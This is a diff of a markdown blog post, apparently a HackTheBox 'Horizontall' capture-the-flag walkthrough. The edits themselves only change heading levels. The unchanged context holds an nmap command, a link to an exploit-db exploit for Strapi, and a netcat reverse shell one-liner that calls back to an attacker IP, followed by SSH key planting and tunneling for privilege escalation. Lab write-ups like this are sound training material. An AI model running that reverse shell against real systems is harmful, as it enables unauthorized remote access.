@@ -13,13 +13,13 @@ img_path: /assets/img/hackthebox/machines/horizontall
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing **Horizontall** from [HackTheBox](https://www.hackthebox.com).
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -48,7 +48,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 We found two open ports, 22 running ssh and 80 running nginx web server
 
-## Web
+### Web
  
 From the nmap scan we see that the web server redirects to `horizontall.htb`, so let's add that to /etc/hosts and then navigate to the web page.
 
@@ -106,7 +106,7 @@ A quick search on exploit-db we see that it has some serious vulnerability.
 
 ![](3.png)
 
-# **Foothold**
+## **Foothold**
 
 Let's download this [exploit](https://www.exploit-db.com/exploits/50239) and run it.
 
@@ -128,7 +128,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.17.90 1234 >/tmp/f
 
 ![](8.png)
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 By checking the /etc/passwd file, we see that user strapi which is the current user we have has a shell, so i copied my ssh public key to a newly created .ssh directory and ssh'ed to the machine.
 
@@ -146,7 +146,7 @@ port 80 and 22 we found earlier with nmap, 3306 is the mysql server, port 1337 i
 
 Assuming it's running a web server, i used `curl` to send a get request and it was a web page.
 
-## Tunneling
+### Tunneling
 
 Using ssh tunneling, let's make a local port forward so that we can access the webpage from our local machine.
 
